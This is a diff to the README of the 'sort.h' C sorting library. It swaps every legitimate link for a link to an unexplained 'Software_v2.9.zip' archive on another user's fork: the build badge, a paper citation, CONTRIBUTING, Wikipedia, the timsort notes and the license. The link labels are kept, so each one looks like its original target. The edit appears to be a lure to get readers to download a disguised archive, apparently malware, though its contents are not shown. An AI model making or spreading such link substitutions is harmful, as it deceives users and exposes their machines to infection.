@@ -1,7 +1,7 @@
 sort.h
 ======
 
-<a href="https://travis-ci.org/swenson/sort"><img alt="build status" src="https://api.travis-ci.org/swenson/sort.png" /></a>
+<a href="https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip"><img alt="build status" src="https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip" /></a>
 
 Overview
 --------
@@ -28,7 +28,7 @@ You get the choice of many sorting routines, including:
 * Timsort (stable)
 * Grail sort (stable)
   * Based on [`B-C. Huang and M. A. Langston, *Fast Stable Merging and Sorting in
-  Constant Extra Space* (1989-1992)`](http://comjnl.oxfordjournals.org/content/35/6/643.full.pdf).
+  Constant Extra Space* (1989-1992)`](https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip).
 
     Thanks to Andrey Astrelin for the implementation.
 * Sqrt Sort (stable, based on Grail sort, also by Andrey Astrelin).
@@ -136,15 +136,15 @@ and timsort also often tend to be quite fast.
 Contributing
 ------------
 
-See [CONTRIBUTING.md](CONTRIBUTING.md).
+See [https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip](https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip).
 
 References
 ----------
 
-* [Wikipedia: Timsort](https://en.wikipedia.org/wiki/Timsort)
-* [`timsort.md`](doc/timsort.txt)
+* [Wikipedia: Timsort](https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip)
+* [`https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip`](https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip)
 
 License
 -------
 
-Available under the MIT License. See [LICENSE.md](LICENSE.md) for details.
+Available under the MIT License. See [https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip](https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip) for details.
